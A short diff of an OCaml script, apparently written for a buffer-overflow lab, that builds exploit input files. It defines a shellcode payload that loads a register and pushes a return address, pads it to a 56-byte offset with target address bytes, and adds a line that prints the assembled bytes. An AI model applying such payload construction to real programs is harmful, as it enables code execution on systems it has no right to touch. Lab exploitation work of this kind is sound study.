@@ -13,6 +13,8 @@ let _ = mini_exploit 56 "42 1d 6a"
 
 let payload = "mov edi, 0x40c15130; push 0x00421d96; ret"
 
+let _ = Asm.asm payload |> Asm.asm_bytes |> Asm.print_bytes |> print_newline
+
 let atk1 = open_out "atk1.bin"
 
 let _ = exploit_in 56 payload "55 61 3b f0"
